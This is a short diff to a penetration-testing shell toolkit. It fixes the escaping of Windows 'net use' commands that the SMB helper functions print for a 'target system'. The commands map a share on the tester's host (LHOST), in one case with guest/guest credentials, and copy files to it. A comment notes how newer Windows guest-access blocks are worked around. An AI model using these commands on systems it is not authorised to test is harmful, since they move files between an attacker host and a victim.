@@ -222,7 +222,7 @@ nb-srv-smb-null() {
   __info "Command to use on a target system copied to clipboard"
   __info "The server can authenticate without credentials."
   __info "You can mount the share on the box and copy files to it using commands:"
-  __ok "  net use x: \\\\\\${__LHOST}\\\\share"
+  __ok "  net use x:\\\\\\${__LHOST}\\share"
   __ok "  cmd /c \"copy filename.txt X:\\\""
   pushd "$HOME/desktop/server" &> /dev/null
   echo
@@ -260,7 +260,7 @@ nb-srv-smb-auth() {
   __info "2 Commands to use on a target system copied to clipboard"
   __info "The server will use the credentials guest/guest for authentication."
   __info "You can mount the share on the box and copy files to it using commands:"
-  __ok "  net use x: \\\\\\${__LHOST}\\\\share /user:guest guest"
+  __ok "  net use x:\\\\\\${__LHOST}\\share /user:guest guest"
   __ok "  cmd /c \"copy filename.txt X:\\\""
 
   # New versions of Windows block unauthenticated guest access, to bypass set username and pass
